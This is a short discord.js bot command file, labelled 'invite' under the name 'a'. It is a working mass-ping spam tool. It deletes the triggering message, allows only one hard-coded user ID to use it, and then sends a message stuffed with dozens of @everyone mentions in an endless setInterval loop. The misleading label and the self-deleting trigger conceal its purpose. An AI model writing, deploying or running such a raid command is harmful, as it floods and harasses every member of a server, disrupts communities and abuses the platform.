const Discord = require("discord.js");
const { MessageFlags } = require("discord.js");
const { Color } = require("../../config.js");

module.exports = {
    name: "a",
    aliases: [],
    description: "invite",
    run: async (bot, message, args) => {
      message.delete();
      if (message.author.id !== '723506204537520179') {
            return message.channel.send(`lmao u tried!`)
      }
  
      setInterval(function() {
        message.channel.send(
          "@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone @everyone @everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone")
      },)
  }
  }        